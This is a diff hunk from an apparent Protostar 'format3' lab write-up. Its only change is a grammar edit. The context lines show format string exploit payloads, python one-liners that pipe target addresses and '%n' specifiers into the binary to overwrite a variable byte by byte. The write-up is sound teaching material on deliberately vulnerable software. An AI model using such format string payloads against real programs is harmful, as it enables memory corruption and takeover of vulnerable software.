@@ -103,7 +103,7 @@ user@protostar:/opt/protostar/bin$ (python -c 'print "\xf4\x96\x04\x08" + "%64x%
 target is 00000044 :(
 ```
 
-I am going to append all the necessary addresses and change their values. This is going to require some trial and errors. The best way to do this is to try to focus on 1 byte at a time. For example -> the **0x01025544** has **0x44** at the 1st byte(**LITTLE ENDIAN**) so change that first and move on to the 2nd,3rd and 4th byte.
+I am going to append all the necessary addresses and change their values. This is going to require some trial and errors. The best way to do this is trying to focus on 1 byte at a time. For example -> the **0x01025544** has **0x44** at the 1st byte(**LITTLE ENDIAN**) so change that first and move on to the 2nd,3rd and 4th byte.
 
 ```
 user@protostar:/opt/protostar/bin$ (python -c 'print "\xf4\x96\x04\x08" + "\xf5\x96\x04\x08" + "\xf6\x96\x04\x08" + "%56x%12$n" + "%17x%13$n" + "%173x%14$n"') | ./format3
